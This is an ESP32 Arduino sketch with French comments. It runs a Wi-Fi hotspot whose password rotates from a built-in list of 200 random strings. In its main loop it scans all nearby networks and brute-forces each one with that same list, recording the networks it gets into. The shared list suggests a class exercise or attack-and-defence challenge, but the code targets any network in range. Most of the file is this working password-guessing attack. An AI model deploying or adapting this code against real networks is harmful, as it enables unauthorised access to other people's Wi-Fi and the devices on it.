#include <WiFi.h>

#define TIMEOUT 1500 // Timeout pour chaque tentative en ms
#define MAX_SUCCESS 10

// SSID du hotspot et mot de passe initial
const char *apSSID = "wifi_m2dfs_milan";
char apPassword[32]; // Stocke le mot de passe actuel du hotspot

// Liste des mots de passe possibles
const char *passwords[] = {
    "kxzvaajn", "nulebozl", "sylmukyv", "fzxhzodw", "mnhfwylw", "xhnvtwdd", "jrulvtsp", "ochdamfa", "plaluafr", "ovnkkilc",
    "oizuxgas", "tjrdbrav", "pklzocye", "vtapalxp", "rtagjdnv", "frvuyeoe", "xghgxava", "rgolvnna", "yfxeqlny", "aewazmzb",
    "shsiejiu", "iuvmohlb", "cjvxdfsl", "qpikserq", "utacmzqp", "ooxevhdn", "sxthtwxj", "llrwdkcx", "ddudifar", "zphrewdm",
    "mpdkrxev", "updhshlc", "tllzdwkl", "riyypzdz", "oemqckth", "tffobpzd", "gtffxvfi", "txjtdwqy", "jfiqxhca", "sgypghxn",
    "juixjinr", "aowreqdu", "swjeitqz", "igjautba", "aiyqeglh", "oswyyore", "xptdcttd", "pcprabke", "kmqzndiw", "dpqzamtm",
    "dyzcslls", "navqcfvd", "anowzypk", "suahetlj", "yfhccclh", "qbmdivqr", "qblucjky", "dguzkxel", "ylpyzgjf", "kbfcdujc",
    "ctuqkrdr", "ajevmebu", "skmcsqfz", "ffzlwiio", "aftglkvf", "xxdgtzlw", "cvlfsunn", "bhdvmvku", "nfqzutau", "ggxbhrho",
    "qyfalgmh", "tcxkbhrn", "qpogobwf", "cllvemtd", "vthbmclx", "mygnkqqa", "whfrjrlf", "gwfeqkgf", "fkvgcrjw", "lezddzaj",
    "xvczgqaa", "iekrpdyj", "ebkftonw", "eoudylkl", "ebxoxxfm", "janmvljn", "xfudqipe", "yuyfhefw", "irxkfjbq", "kwdvygqs",
    "yvhsdunb", "qhqzskuo", "nkcuqjjx", "treyrebr", "iubgkumg", "iqeblqrp", "awllfhdq", "ywbvnsvp", "eqivzdwz", "feskhshm",
    "fytbaolk", "lnqguosc", "mplxzpwm", "vsedeanw", "rvcnmtqq", "fsptuhkw", "pmjuvole", "fxwnbwxl", "rnkilsjh", "uqpkhdhl",
    "pqzxizwu", "lfgpxewt", "wbsvxglw", "adkfvisy", "moslxmvo", "caiongpk", "mdfldeyy", "fsacirgb", "seosmnio", "zjafdgsg",
    "xjhbsqbr", "emjtockn", "ymajxpiu", "nijknifq", "hbkawhxp", "dxpygtws", "pkkkfsqc", "yfgydefu", "ocnbsmfu", "hqxndvfm",
    "mpzxmzmc", "ynbxnvcb", "yvmmciwz", "nycmnnfk", "foitwmhx", "wslaloll", "obsotlwf", "qcejxtcc", "jytvottv", "yhgoeojj",
    "nqvxubel", "zekupkif", "iuxizxgu", "ksfdaahq", "rfdyxagk", "aodiivkl", "nbomkfft", "gzjubrrt", "xkzfllsy", "zwnghvsp",
    "lbdnrijp", "tztubmsb", "tmnfepsp", "dvhmvvak", "qldcakpn", "gaykchmm", "viulztoy", "rgppnxmt", "gxhxirmi", "nkrhfpvl",
    "cnuvswpy", "qitnplny", "wrjcumvb", "fmksndas", "cwotawuz", "lzkfjavt", "deshqjlv", "hfcrpmqj", "stgtdpmk", "nealxloj",
    "pqwygeet", "uuvqbkxw", "gyxuyioo", "rqkuzleq", "czuaaire", "pyxcaiqc", "exxysayd", "jajnriij", "nchoqudf", "uzexsnfm",
    "jajuagec", "rnutbptb", "ogvbnogl", "emwuzqan", "kcgzpxfo", "fhgjzrxe", "nrncgdsx", "cywwydif", "lyuzcaqv", "iwzzufyn",
    "qbfjmlfi", "tdnsshfc", "kssrcayx", "ifykxdys", "bazausxn", "wahbnioc", "jvnqahyb", "jngbwrke", "nobrqqda", "qjoehftw"};

const int numPasswords = sizeof(passwords) / sizeof(passwords[0]);

// Liste pour stocker les réseaux Wi-Fi connectés avec succès
String successfulConnections[10]; // Limité à 10 pour cet exemple
int successfulCount = 0;

void changeHotspotPassword()
{
    int randomIndex = random(0, numPasswords);
    strncpy(apPassword, passwords[randomIndex], sizeof(apPassword) - 1);
    apPassword[sizeof(apPassword) - 1] = '\0';

    WiFi.softAP(apSSID, apPassword); // Met à jour le hotspot avec un nouveau mot de passe
    Serial.printf("Hotspot password changed to: %s 🔑\n", apPassword);
}

void WiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info)
{
    switch (event)
    {
    case WIFI_EVENT_AP_STACONNECTED:
        Serial.println("Client connected, changing password... 🔄");
        changeHotspotPassword();
        break;

    case WIFI_EVENT_AP_STADISCONNECTED:
        Serial.println("Client disconnected 🚪");
        break;

    default:
        break;
    }
}

void setup()
{
    Serial.begin(9600);
    Serial.println("Setting up Wi-Fi access point... 📶");

    randomSeed(analogRead(0)); // Initialise la génération de nombres aléatoires
    changeHotspotPassword();   // Définit un mot de passe initial aléatoire

    WiFi.onEvent(WiFiEvent); // Écoute les événements Wi-Fi
    WiFi.softAP(apSSID, apPassword);

    Serial.print("Access Point IP address: ");
    Serial.println(WiFi.softAPIP());
}

void loop()
{
    scanAndConnect();
    delay(5000); // Attendre seulement 5 sec avant de refaire un scan
}

void scanAndConnect() {
    Serial.println("🔍 Scanning for Wi-Fi networks...");

    int numNetworks = WiFi.scanNetworks();
    if (numNetworks == -1) {
        Serial.println("❌ Error during Wi-Fi scan");
        return;
    }

    Serial.printf("✅ Found %d networks:\n", numNetworks);

    for (int i = 0; i < numNetworks; i++) {
        String ssid = WiFi.SSID(i);

        if (isAlreadyConnected(ssid)) {
            Serial.printf("✅ Already connected to %s, skipping...\n", ssid.c_str());
            continue;
        }

        Serial.printf("📡 Target network: %s\n", ssid.c_str());

        for (int j = 0; j < numPasswords; j++) {
            Serial.printf("🔑 Trying password (%d/%d): %s\n", j + 1, numPasswords, passwords[j]);

            WiFi.disconnect(true);
            delay(100);

            WiFi.begin(ssid.c_str(), passwords[j]);
            unsigned long startTime = millis();

            while (millis() - startTime < TIMEOUT) {
                if (WiFi.status() == WL_CONNECTED) {
                    Serial.printf("🎉 Connected successfully to %s!\n", ssid.c_str());
                    Serial.printf("🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());

                    addSuccessfulConnection(ssid);
                    WiFi.disconnect();
                    return; // Arrêter après une connexion réussie
                }
            }
            Serial.println("❌ Incorrect password! Trying next... 🔄");
        }
    }
}

bool isAlreadyConnected(String ssid) {
    for (int i = 0; i < successfulCount; i++) {
        if (successfulConnections[i] == ssid) return true;
    }
    return false;
}

void addSuccessfulConnection(String ssid) {
    if (successfulCount < MAX_SUCCESS) {
        successfulConnections[successfulCount++] = ssid;
    }

    Serial.println("✅ Successfully connected to the following networks:");
    for (int i = 0; i < successfulCount; i++) {
        Serial.printf("%d. %s\n", i + 1, successfulConnections[i].c_str());
    }
}
